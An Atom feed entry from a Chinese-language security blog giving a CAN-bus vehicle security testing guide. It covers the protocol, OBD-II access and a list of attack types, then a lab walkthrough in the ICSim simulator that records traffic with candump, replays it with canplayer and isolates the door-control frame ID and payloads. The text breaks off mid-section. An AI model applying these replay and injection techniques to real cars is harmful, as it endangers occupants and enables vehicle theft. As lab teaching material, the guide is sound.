<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ol4three</title>
  
  <subtitle>一个专注于信息安全技术的白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ol4three.com/"/>
  <updated>2023-07-12T07:18:57.642Z</updated>
  <id>http://www.ol4three.com/</id>
  
  <author>
    <name>ol4three</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>汽车安全测试CAN指南</title>
    <link href="http://www.ol4three.com/2023/07/11/IOT/%E6%B1%BD%E8%BD%A6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95CAN%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.ol4three.com/2023/07/11/IOT/%E6%B1%BD%E8%BD%A6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95CAN%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-07-11T00:48:47.000Z</published>
    <updated>2023-07-12T07:18:57.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CAN相关介绍"><a href="#CAN相关介绍" class="headerlink" title="CAN相关介绍"></a>CAN相关介绍</h2><h3 id="CAN"><a href="#CAN" class="headerlink" title="CAN"></a>CAN</h3><p>在汽车领域，CAN（Controller Area Network）是一种通信协议，用于在车辆电子系统中传输数据和命令。CAN总线是车辆中各个电子控制单元（ECU）之间进行通信的基础设施。</p><p><strong>控制器局域网</strong>（<strong>CAN总线</strong>）是一种<a href="https://en.wikipedia.org/wiki/Vehicle_bus">车辆总线</a>标准，旨在允许<a href="https://en.wikipedia.org/wiki/Microcontroller">微控制器</a>和设备在没有<a href="https://en.wikipedia.org/wiki/Host_computer">主机</a>的情况下与彼此的应用程序通信。这是一个<a href="https://en.wikipedia.org/wiki/Message-based_protocol">基于消息的协议</a>，最初设计用于汽车内的<a href="https://en.wikipedia.org/wiki/Multiplexing">多路</a>电气布线，以节省铜，但它也可以在许多其他环境中使用。对于每个设备，帧中的数据是串行传输的，但如果多个设备同时传输，最高优先级的设备可以继续，而其他设备可以退出。帧由所有设备接收，包括传输设备。<a href="https://en.wikipedia.org/wiki/CAN_bus">^1</a></p><p>在CAN问世之前，车载通信系统是通过点对点的布线系统实现的。随着车载电子元件越来越多，这种通信系统变得愈发笨重，而且维护费用非常昂贵。这时，CAN应运而生，并成为主流的车载通信系统。</p><p>简单地说，CAN允许汽车中的不同电子模块相互通信并分享数据。CAN提案的主要动机是它允许多个ECU（ECU=发动机控制单元=汽车控制单元）仅用一根电缆进行通信。一辆现代汽车最多可以有70个ECU。</p><div align="center"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1626947334_60f93f0604d9a25f766ec.png" alt="img" style="zoom:100%;"></div><a id="more"></a><p>相关介绍文档</p><p><a href="https://zhuanlan.zhihu.com/p/30657287">汽车CAN总线基础介绍</a><a href="https://zhuanlan.zhihu.com/p/30657287">^2</a></p><p><a href="https://www.freebuf.com/articles/network/281831.html">前沿领域探析——汽车CAN总线协议详解及攻击面分析</a><a href="https://www.freebuf.com/articles/network/281831.html">^3</a></p><h3 id="为什么要使用can"><a href="#为什么要使用can" class="headerlink" title="为什么要使用can"></a>为什么要使用can</h3><blockquote><p>安全性：CAN是低级协议，不支持任何内在的安全功能。在标准的CAN中也没有加密，使得网络数据能被截取。在大多数应用中，应用程序需要部署自己的安全机制，例如认证传入命令或网络上某些设备的存在。若不执行适当的安全措施，其他人可能设法在总线上插入消息。尽管一些安全关键功能（如修改固件，编程键或控制防抱死制动）存在密码，但这些系统并未普遍实施，并且密钥对的数量有限。</p><p>通信机制：多主机，即每个节点都有接入总线的能力</p><p>寻址机制：消息区别，不设节点的地址，通过消息的标志符来区别消息。</p><p>帧类型：数据帧、远程帧、错误帧、超载帧、帧间隔</p><p>由于CAN总线上的数据包没有进行过任何的加密处理，因此这些数据包是能够被截取窃听。由于车载网络使用CAN协议进行通信，所以我们可以联想到车联功能也是通过CAN网络进行数据发送和交换。<a href="https://cn-sec.com/archives/1570617.html">^4</a></p></blockquote><p>为什么要使用CAN系统，毕竟还有许多其他的方式可以轻松实现呀？在发明CAN总线之前，汽车制造商使用点对点的布线系统。因此，如果您在汽车中有三个部件，则所有三个部件都需要通过三角形布线系统以点对点方式相互连接。</p><p>假设这三个部件是方向盘、变速箱和ABS。现在，在一个标准的点对点布线系统中，我们需要用线缆将转向系统与变速箱和防抱死系统连在一起，同时，变速箱也需要通过线缆与ABS和转向系统相连。</p><p>这对于组件较少的汽车来说是完美的解决方案。但是，如果一辆汽车拥有多达100个不同ECU和其他组件的话，情况会怎样？除了连线是一件苦差事外，检测布线系统中的故障也不轻松（如果还能检测到的话），这时，故障诊断将是一场真正的噩梦，而且成本高昂。</p><p>面对这种困局，汽车制造商提出了CAN的想法。大量的点对点接线，可以用两条线代替，分别是CANH和CANL，它们是CAN HIGH和CAN LOW的简写。现在，这种通信方式不仅更快、更简单，并且非常容易诊断故障。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/ebd56b1c-8773-4795-9a8d-49c1457b45bd.png" alt="1.png"></p><p>CAN协议的使用在汽车行业中具有重要意义，有以下几个原因：</p><ol><li>实时性和可靠性：CAN总线是一种实时通信协议，可以实现高速数据传输和可靠性的消息传递。这对于车辆中需要实时交换数据的系统至关重要，如发动机管理、刹车系统、安全气囊等。</li><li>多节点通信：CAN总线支持多个节点之间的通信，每个节点可以是一个电子控制单元（ECU）。这样，不同的车辆系统和子系统可以通过CAN总线进行相互连接和通信，实现整车的集成和协调操作。</li><li>简化布线：使用CAN总线可以大大减少车辆中的布线复杂性。相比于传统的点对点电气连接，CAN总线使用共享的双绞线来连接各个节点，降低了线缆数量和重量，简化了系统设计和维护。</li><li>灵活性和可扩展性：CAN总线具有良好的可扩展性，可以轻松地添加和移除节点，以适应不同车型和配置的需求变化。这种灵活性使得车辆系统的开发和升级更加方便和高效。</li></ol><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/CAN%20Bus_Diagram1.png" alt="img"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/CAN_topology-20230712151854925.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CANbus是一种汇流排网路，他的汇流排是由两条线路所实现，当两条线路电位差小的时候为1，电位差大的时候为0。</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/CAN_01.png" alt="img"></p><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>一辆车通常有多个能够发送和/或接收消息的节点。通常来说，每个消息都包含一个ID（表示消息的优先级），以及一个CAN报文，其中可以包含八个字节或更少内容。</p><p>如果两个或多个节点同时开始发送报文，则ID数字较低的节点发送的报文将替换ID数字较高的节点所发送的报文。这被称为基于优先级的总线仲裁。具有较低数值标识符的报文具有较高的优先级，并且总是首先发送。这就是节点在信道上定位和放置最高优先级报文的方式。</p><p>例如，来自制动器的报文的优先级，将高于来自音频播放器的报文。</p><p>请注意，较低的ID = 较高的优先级。</p><p>如果两个或更多的节点同时开始发送报文，以显性ID发送的报文将覆盖那些隐性ID报文。</p><p>CAN总线由两条不同的线缆组成。由于它是一条总线，许多设备都连接到它上面。一个CAN帧有3个主要部分，它们是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">仲裁标识符</span><br><span class="line">数据长度代码</span><br><span class="line">数据字段</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/CAN_dataframe1.png" alt="CAN数据帧1"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/e1239147-47ee-4b6d-9bb3-edb31836d5e1.png" alt="CAN数据帧2.png"></p><p><a href="http://wiki.csie.ncku.edu.tw/embedded/CAN">详细的数据格式</a><a href="http://wiki.csie.ncku.edu.tw/embedded/CAN">^5</a></p><h3 id="CAN报文"><a href="#CAN报文" class="headerlink" title="CAN报文"></a>CAN报文</h3><p>下图展示的是我们记录下来的CAN报文。第一列是接口，第二列是仲裁ID，第三列是CAN报文的大小，第四列是CAN数据本身。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711145110957.png" alt="image-20230711145110957" style="zoom:50%;"><p>在这个例子中，我们将看到一个8字节的数据帧。该报文以ID <strong>0x111</strong>发送。一旦仪表盘看到这个消息，它会首先判断它是否是为仪表盘准备的。如果是，那么它读取的信息将是<strong>0x0BB8</strong>，转化为十进制值为3000。现在，仪表盘将转速表上的指针移到3000的位置。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/54869eab-d525-4f91-8ff3-59e551ea6983.png" alt="1.png"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/823d5ec4-1cd7-49a7-a68a-c35b7ca79896.png" alt="1.png"></p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><h3 id="为什么要关注can"><a href="#为什么要关注can" class="headerlink" title="为什么要关注can"></a>为什么要关注can</h3><blockquote><p>因为几乎每辆车都使用CAN，这是法律规定的，导致CAN不会很快停止使用。同时在设计CAN总线的开发中并没有考虑到现代安全问题。</p></blockquote><p>要访问汽车的CAN总线，必须能够访问驾驶室诊断端口，也就是OBD。虽然当前的诊断标准和端口有数百种之多，但如今OBD-II已经成为常用端口，几乎所有汽车都使用这种诊断端口。在汽车修理工诊断汽车故障时，使用的就是它。</p><p>通过OBD可以直接访问CAN，并且是最直接的方式。另外，OBD-II也很容易找到：通常位于前排乘客或驾驶员座位附近的某个地方，而且不需要螺丝刀就能连接使用。</p><p>OBD 的样子如下所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/e30566bd-76d6-41f1-9b7a-1978c9e7fdeb.png" alt="1.png"></p><p>OBD引脚的布局情况如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/819ea304-ed9e-4d34-8c55-78369bfa5732.png" alt="1.png"></p><p>第6和第14引脚为CANH和CANL</p><ol><li>恶意消息注入：攻击者通过物理接入或软件漏洞向CAN总线注入恶意消息，干扰车辆系统的正常功能或引发安全问题。</li><li>报文重放攻击：攻击者拦截和重放CAN总线上的消息，以欺骗车辆系统执行未经授权的操作。</li><li>欺骗和伪装：攻击者伪造或伪装CAN总线上的消息，误导车辆系统做出错误判断或执行不安全的操作。</li><li>拒绝服务（DoS）攻击：攻击者发送大量无效或恶意的消息，导致CAN总线过载，影响车辆系统的正常功能。</li><li>未经授权的访问：攻击者未经授权地访问CAN总线，通过物理接触或其他方式获取对车辆网络的控制权。</li><li>ECU固件攻击：攻击者利用ECU（电子控制单元）中的软件漏洞或弱点，获取对CAN总线的控制权。</li><li>CAN总线窃听：攻击者通过拦截CAN总线上的消息来获取车辆的敏感信息，如速度、位置等。</li><li>CAN总线分析和逆向工程：攻击者分析CAN总线的通信协议和消息格式，以理解车辆系统的工作原理，并可能发现漏洞。</li><li>车辆网络中间人攻击：攻击者通过插入中间设备或攻击节点，截取、篡改或注入CAN总线上的消息。</li><li>软件更新攻击：攻击者利用不安全的软件更新机制，通过CAN总线向车辆系统中注入恶意软件或固件。</li></ol><h3 id="通过OBD访问CAN"><a href="#通过OBD访问CAN" class="headerlink" title="通过OBD访问CAN"></a>通过OBD访问CAN</h3><p>连接到OBD-II所需的硬件设备可以很容易在市场上找到，比较贵的包括Kvaser和EMS，它们不是一般的贵，而是太贵了。不过，我们可以选用USB2CAN，这是一个用于Linux系统的接口，大概60欧元左右。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/c480bf34-0efa-47b7-bf9d-7784cd6b126a.png" alt="1.png"></p><p>基于ELM327和蓝牙的设备。测试比较不方便，因为数据速率较慢，会丢失大量的数据包。但相对比较便宜，约为10欧元</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/ea346313-4c4a-40dc-91cb-6813162b9829.png" alt="1.png"></p><p>Macchina M2（价值85欧元）</p><p>Macchina M2是一个开源的汽车接口，可以用于通过OBD-II与CAN总线通信。Macchina M2的最大特点在于：它是模块化的，这意味着你可以在M2上添加WiFi、GSM、LTE、BLE。M2有2个CAN信道。此外，M2还支持LIN</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7c5ac45a-8eb9-4be1-b8df-26d5667e169c.png" alt="1.png"></p><p>CSS电子公司的CLX000，成本较低，它可以用来记录和传输CAN数据。这些数据可以通过免费的Wireshark开源软件进行显示，而且还有一个插件，可以帮助我们实现逆向分析。</p><p>CLX000是可视化和远程信息处理的理想选择。</p><p><a href="https://www.csselectronics.com/pages/can-bus-sniffer-reverse-engineering">CLX000相关介绍</a><a href="https://www.csselectronics.com/pages/can-bus-sniffer-reverse-engineering">^6</a></p><h2 id="环境相关"><a href="#环境相关" class="headerlink" title="环境相关"></a>环境相关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Macos 12.3</span><br><span class="line">Ubuntu 20.04</span><br><span class="line">ICSim</span><br><span class="line">Can-utils</span><br><span class="line">SocketCAN</span><br><span class="line">vcan</span><br><span class="line">Wireshark</span><br></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="SDL"><a href="#SDL" class="headerlink" title="SDL"></a>SDL</h4><p>SDL是一个用于计算机图形和音频的多平台开发库。ISCim使用了虚拟控制面板，并以动画的形式展示数据。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libsdl2-dev libsdl2-image-dev -y</span><br></pre></td></tr></table></figure><h4 id="Can-utils"><a href="#Can-utils" class="headerlink" title="Can-utils"></a>Can-utils</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install can-utils -y</span><br></pre></td></tr></table></figure><p>为了发送、接收和分析CAN数据包，我们需要用到CAN工具。Can-utils是一套Linux工具，它允许Linux与车内CAN网络进行通信。Can-utils主要由5个工具组成：</p><ol><li>cansniffer：用于嗅探数据包</li><li>cansend：用于编写数据包</li><li>candump：转储所有下载的数据包</li><li>canplayer：用于重放CAN数据包</li><li>cangen：用于创建随机的CAN数据包</li></ol><h4 id="ICSim"><a href="#ICSim" class="headerlink" title="ICSim"></a>ICSim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zombieCraig&#x2F;ICSim.git</span><br><span class="line">cd ICSim-master&#x2F;</span><br><span class="line">sudo make</span><br></pre></td></tr></table></figure><h4 id="SavvyCan"><a href="#SavvyCan" class="headerlink" title="SavvyCan"></a>SavvyCan</h4><p>SavvyCAN为我们提供了更多的功能。对于初学者来说，它提供了一个很好的GUI，可以帮助你轻松地浏览、过滤数据包、ID等</p><blockquote><p>“SavvyCAN是一个基于多个QT平台的C++程序，主要用于CAN数据的逆向分析和捕获。它最初是为了介绍EVTVDue和CANDUE等EVTV硬件的用法而编写的。此后，它被扩展到适用于任何socketCAN兼容设备，以及Macchina M2和Teensy 3.x板。它可以同时捕获并发送至多个总线和CAN摄像机。”<a href="https://zhuanlan.zhihu.com/p/470681140">^7</a></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;collin80&#x2F;SavvyCAN&#x2F;releases&#x2F;download&#x2F;continuous&#x2F;SavvyCAN-0f32533-x86_64.AppImage</span><br><span class="line">chmod 744 SavvyCAN-305dafd-x86_64.AppImage</span><br><span class="line">.&#x2F;SavvyCAN-305dafd-x86_64.AppImage</span><br></pre></td></tr></table></figure><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository universe</span><br><span class="line">sudo apt install wireshark</span><br><span class="line">sudo wireshark</span><br></pre></td></tr></table></figure><h3 id="创建虚拟网络"><a href="#创建虚拟网络" class="headerlink" title="创建虚拟网络"></a>创建虚拟网络</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ cat setup_vcan.sh </span><br><span class="line">sudo modprobe can</span><br><span class="line">sudo modprobe vcan</span><br><span class="line">sudo ip link add dev vcan0 type vcan</span><br><span class="line">sudo ip link set up vcan0</span><br></pre></td></tr></table></figure><p>这里的modprobe命令是用来加载内核单元的，比如can和vcan。最后两行将创建一个vcan0接口，以模拟汽车网络。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ .&#x2F;setup_vcan.sh</span><br><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ ifconfig vcan0</span><br><span class="line">vcan0: flags&#x3D;193&lt;UP,RUNNING,NOARP&gt;  mtu 72</span><br><span class="line">        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><h3 id="运行模拟器"><a href="#运行模拟器" class="headerlink" title="运行模拟器"></a>运行模拟器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;icsim vcan0</span><br><span class="line">.&#x2F;controls vcan0</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711112517059.png" alt="image-20230711112517059"></p><p>Vcan0是虚拟的CAN接口，ICSim将通过它发送和接收CAN帧。一旦启动控制面板，速度表会出现一些波动。这是由于控制面板所模拟的噪音而造成的。</p><p>启动控制面板后，我们就可以使用键盘上的按键来模拟各种运动。</p><p>使用以下组合键，可以对ICSim控制面板进行相应的修改：</p><table><thead><tr><th align="center">功能</th><th align="center">控制按钮</th></tr></thead><tbody><tr><td align="center">转向</td><td align="center">键盘左右</td></tr><tr><td align="center">速度</td><td align="center">键盘上下</td></tr><tr><td align="center">开/关左前车门</td><td align="center">右shift/左shit+A</td></tr><tr><td align="center">开/关右前车门</td><td align="center">右shift/左shit+B</td></tr><tr><td align="center">开/关左后车门</td><td align="center">右shift/左shit+X</td></tr><tr><td align="center">开/关右后车门</td><td align="center">右shift/左shit+Y</td></tr><tr><td align="center">开启全部车门</td><td align="center">左shift+右shift</td></tr><tr><td align="center">关闭全部车门</td><td align="center">右shift+左shift</td></tr></tbody></table><p>可以看到我们启动车辆并打开了右侧的所有车门</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711122924814.png" alt="image-20230711122924814"></p><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p><a href="https://zhuanlan.zhihu.com/p/470681140">can口数据传输</a><a href="https://zhuanlan.zhihu.com/p/470681140">^7</a></p><h4 id="cangen"><a href="#cangen" class="headerlink" title="cangen"></a>cangen</h4><p>cangen可以为教育用途而创建各种CAN帧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CANGEN(1)                                           User Commands                                           CANGEN(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       cangen - manual page for cangen 2018.02.0-1ubuntu1</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       cangen [options] &lt;CAN interface&gt;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       cangen - CAN frames generator for testing purposes.</span><br><span class="line"></span><br><span class="line">       cangen: generate CAN frames</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cangen vcan0</span><br></pre></td></tr></table></figure><p>打开wireshark查看can数据包，</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711150755090.png" alt="image-20230711150755090"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711150927912.png" alt="image-20230711150927912"></p><h4 id="candump"><a href="#candump" class="headerlink" title="candump"></a>candump</h4><p>抓取记录can数据帧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CANDUMP(1)                                          User Commands                                          CANDUMP(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       candump - manual page for candump 2018.02.0-1ubuntu1</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       candump [options] &lt;CAN interface&gt;+</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       candump - dump CAN bus traffic.</span><br><span class="line"></span><br><span class="line">              (use CTRL-C to terminate candump)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用candump来处理帧，可以使用如下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candump vcan0</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711151253186.png" alt="image-20230711151253186" style="zoom:50%;"><p>每个数据帧的具体含义在上文已经介绍过了</p><p>candump还可以用来记录帧。在进行重放攻击时，需要先记录相应的帧，然后，用canplayer这样的小工具来重放这些帧。为了记录CAN帧，可以添加命令选项 -l</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candump -l vcan0</span><br><span class="line">cat xxx.log</span><br></pre></td></tr></table></figure><p>效果如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ candump -l vcan0</span><br><span class="line">Disabled standard output while logging.</span><br><span class="line"></span><br><span class="line">Enabling Logfile &#39;candump-2023-07-11_001859.log&#39;</span><br><span class="line"></span><br><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ cat candump-2023-07-11_001859.log | head -n 10</span><br><span class="line">(1689059836.133615) vcan0 244#0000000188</span><br><span class="line">(1689059836.136605) vcan0 183#0000000500001024</span><br><span class="line">(1689059836.136908) vcan0 039#001B</span><br><span class="line">(1689059836.137158) vcan0 143#6B6B00E0</span><br><span class="line">(1689059836.137402) vcan0 095#800007F400000017</span><br><span class="line">(1689059836.139850) vcan0 1A4#0000000800000010</span><br><span class="line">(1689059836.140154) vcan0 1AA#7FFF000000006810</span><br><span class="line">(1689059836.140405) vcan0 1B0#000F0000000157</span><br><span class="line">(1689059836.140650) vcan0 1D0#000000000000000A</span><br><span class="line">(1689059836.147874) vcan0 244#0000000106</span><br></pre></td></tr></table></figure><h4 id="canplayer"><a href="#canplayer" class="headerlink" title="canplayer"></a>canplayer</h4><p>canplayer可以用来播放CAN帧；需要进行重放攻击时，使用canplayer重放这些CAN帧。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CANPLAYER(1)                                              User Commands                                             CANPLAYER(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       canplayer - manual page for canplayer 2018.02.0-1ubuntu1</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       canplayer &lt;options&gt; [interface assignment]*</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       canplayer - replay a compact CAN frame logfile to CAN devices.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">canplayer -I canfile.log</span><br></pre></td></tr></table></figure><h4 id="cansniffer"><a href="#cansniffer" class="headerlink" title="cansniffer"></a>cansniffer</h4><p>使用CAN嗅探器来查看CAN数据的变化。来查看特定字节的变化。Cansniffer有一个-c选项，能够通过颜色来展示字节的变化。这个工具的工作方式为：比较字节当前值和之前的值，如果存在差异，就用字节的颜色变化来加以表示。当你想知道当对汽车进行的操作是否导致CAN数据发生变化时，这个功能会非常有用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CANSNIFFER(1)                                             User Commands                                            CANSNIFFER(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       cansniffer - manual page for cansniffer 2018.02.0-1ubuntu1</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       cansniffer [can-interface]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还可以进行ID过滤。因此，如果只想查看来自某个特定ID的帧，比如说0x011，你可以根据ID进行过滤。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cansniffer -c vcan0</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711160037335.png" alt="image-20230711160037335" style="zoom:50%;"><p>CAN帧的变化非常快，因为有大量数据高速传输。在一辆真正的汽车中，这是非常常见的。为此，我们可以使用ID进行过滤。如果你想只考察ID为40C的帧，你可以先按-，然后按000000，再按回车键，以从cansniffer中删除所有的ID对应的数据；然后，按+，然后按要过滤的ID，再按回车键即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711160204392.png" alt="image-20230711160204392"></p><h4 id="cansend"><a href="#cansend" class="headerlink" title="cansend"></a>cansend</h4><p>Cansend用于将CAN帧发送到一个特定的CAN接口。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CANSEND(1)                                                User Commands                                               CANSEND(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       cansend - manual page for cansend 2018.02.0-1ubuntu1</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       cansend - simple command line tool to send CAN-frames via CAN_RAW sockets.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ICSim实战"><a href="#ICSim实战" class="headerlink" title="ICSim实战"></a>ICSim实战</h2><h3 id="candump命令来记录和保存帧"><a href="#candump命令来记录和保存帧" class="headerlink" title="candump命令来记录和保存帧"></a>candump命令来记录和保存帧</h3><p>candump命令来记录和保存帧，与此同时，我们将通过按左、右方向键来加油门。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ candump -l vcan0</span><br><span class="line">Disabled standard output while logging.</span><br><span class="line"></span><br><span class="line">Enabling Logfile &#39;candump-2023-07-11_010451.log&#39;</span><br><span class="line"></span><br><span class="line">^Z</span><br><span class="line">[19]+  Stopped                 candump -l vcan0</span><br></pre></td></tr></table></figure><h3 id="canplayer重放数据帧"><a href="#canplayer重放数据帧" class="headerlink" title="canplayer重放数据帧"></a>canplayer重放数据帧</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">canplayer -I candump-2023-07-11_010451.log</span><br></pre></td></tr></table></figure><p>仪表板闪光灯以及速度表和我们刚刚的操作一样</p><p>在真实的汽车中，CAN总线可能会复杂得多，而且CAN帧的出现速度也会快得多，所以定位ID可能相当困难。因此，为了方便识别ID，可以使用二分法进行判断操作：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/f6cde2ed-8b1b-4814-aff8-8cc723c6b907.png" alt="1.png"></p><h3 id="二分法分析车门数据帧"><a href="#二分法分析车门数据帧" class="headerlink" title="二分法分析车门数据帧"></a>二分法分析车门数据帧</h3><p>查看数据帧大小，并将其分割为2份，使用二分法就行对应的定位</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ wc candump-2023-07-11_010659.log </span><br><span class="line"> 22657  67972 999424 candump-2023-07-11_010659.log</span><br><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ split -l 11000 candump-2023-07-11_010659.log poc1</span><br><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ l</span><br><span class="line">art&#x2F;                           controls*   controls.o  icsim*   icsim.o  lib.h  LICENSE   poc1aa  poc1ac     setup_vcan.sh*</span><br><span class="line">candump-2023-07-11_010659.log  controls.c  data&#x2F;       icsim.c  lib.c    lib.o  Makefile  poc1ab  README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到多出了poc1aa和poc1ac两个数据帧可以对两个数据帧进行筛选排查，通过二分法我们找到了左前侧开门的数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcan0 19B#00000E000000</span><br></pre></td></tr></table></figure><p>我们重新抓取CAN数据帧，依次进行开门相关操作在日志中寻找所有的ID值为19B的数据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1689072859.589432) vcan0 19B#00000F000000</span><br><span class="line">(1689072862.251934) vcan0 19B#00000E000000</span><br><span class="line">(1689072862.772209) vcan0 19B#00000C000000</span><br><span class="line">(1689072863.551861) vcan0 19B#000008000000</span><br><span class="line">(1689072864.255847) vcan0 19B#000000000000</span><br><span class="line">(1689072866.434218) vcan0 19B#000001000000</span><br><span class="line">(1689072867.233993) vcan0 19B#000003000000</span><br><span class="line">(1689072867.659189) vcan0 19B#000007000000</span><br><span class="line">(1689072868.017096) vcan0 19B#00000F000000</span><br><span class="line">(1689072868.765074) vcan0 19B#000000000000</span><br><span class="line">(1689072869.560115) vcan0 19B#00000F000000</span><br></pre></td></tr></table></figure><p>最终分析确定部分can数据帧，其他数据帧保存为车门当时状态可自行分析</p><table><thead><tr><th>操作</th><th>can数据帧</th></tr></thead><tbody><tr><td>开左前门</td><td>19b#00000e000000</td></tr><tr><td>开右前们</td><td>19b#00000c000000</td></tr><tr><td>开左后门</td><td>19b#000008000000</td></tr><tr><td>开右后门</td><td>19b#000000000000</td></tr><tr><td>开启全部车门/关闭全部车门</td><td>19b#000000000000/19B#00000F000000</td></tr></tbody></table><h3 id="SavvyCan分析车门数据帧"><a 